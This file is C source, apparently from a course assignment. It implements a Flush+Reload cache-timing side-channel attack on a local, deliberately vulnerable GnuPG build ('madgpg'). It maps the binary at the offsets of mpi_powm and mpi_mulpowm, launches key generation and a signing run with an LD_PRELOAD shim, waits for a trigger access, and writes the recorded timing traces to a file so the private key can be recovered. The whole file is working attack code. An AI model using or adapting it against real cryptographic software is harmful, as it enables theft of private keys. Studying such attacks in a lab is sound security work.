#define _GNU_SOURCE

#include "flush_reload.h"

#include <errno.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>

static inline uint64_t read_tsc(void) {
    unsigned int low;
    unsigned int high;
    __asm__ __volatile__("rdtsc" : "=a"(low), "=d"(high));
    return ((uint64_t)high << 32) | low;
}

static void write_trace(const char *path, uint32_t *trace, uint32_t count) {
    FILE *out = fopen(path, "w");
    if (!out) {
        perror("fopen");
        return;
    }

    for (uint32_t i = 0; i < count; ++i) {
        fprintf(out, "%" PRIu32 " %" PRIu32 "\n", trace[2U * i], trace[2U * i + 1U]);
    }

    fclose(out);
}

int main(void) {
    const char *real_root = "/home/fonkor2b/Assignment1";
    const char *alias_root = "/tmp/assignment";
    const char *local_trigger = "/home/victim/trigger";
    const char *local_madgpg = "/home/victim/madgpg";
    const char *local_shim = "/home/fonkor2b/Assignment1/libvictimshim.so";
    const char *local_home = "/tmp/madgpg-home";

        
    (void)real_root;
    (void)alias_root;

    // Make sure the local victim environment exists.
    if (mkdir(local_home, 0755) != 0 && errno != EEXIST) {
        perror("mkdir");
        return 1;
    }

    void *trigger = map((char *)local_trigger, 0ULL);
    if (!trigger) {
        perror("map trigger");
        return 1;
    }

    // Address of mpi_powm() and mpi_mulpowm() in the vulnerable binary.
    void *p1 = map((char *)local_madgpg, 0x00d58a0ULL);
    void *p2 = map((char *)local_madgpg, 0x00d7112ULL);
    if (!p1 || !p2) {
        perror("map madgpg");
        return 1;
    }

    // Generate a usable key in a temporary GNUPG home.
    pid_t keygen = fork();
    if (keygen == 0) {
    	setenv("HOME", local_home, 1);
    	execl("/bin/bash", "bash", "-lc",
              "HOME=/tmp/madgpg-home /home/victim/madgpg --gen-key --passphrase \"\" --batch /home/victim/genkeyparams",
              (char *)NULL);
    	perror("execl keygen");
    	_exit(1);
    }
	waitpid(keygen, NULL, 0);

    pid_t signer = fork();
    if (signer == 0) {
        setenv("HOME", local_home, 1);
        setenv("LD_PRELOAD", local_shim, 1);
        execl("/bin/bash", "bash", "-lc",
              "HOME=/tmp/madgpg-home LD_PRELOAD=/home/fonkor2b/Assignment1/libvictimshim.so /home/victim/madgpg --sign --output=/dev/null /dev/null",
              (char *)NULL);
	perror("execl signer");
        _exit(1);
    }

    if (monitor(trigger, 10000U, 5000000000ULL) == 0) {
        fprintf(stderr, "trigger was not accessed in time\n");
        kill(signer, SIGTERM);
        waitpid(signer, NULL, 0);
        return 1;
    }

    uint32_t *trace = calloc(2000U, sizeof(uint32_t));
    if (!trace) {
        perror("calloc");
        return 1;
    }

    uint32_t count = 200U;
    fr_trace(p1, p2, 10000U, count, trace);
    write_trace("gnupg.txt", trace, count);

    waitpid(signer, NULL, 0);
    free(trace);
    return 0;
}
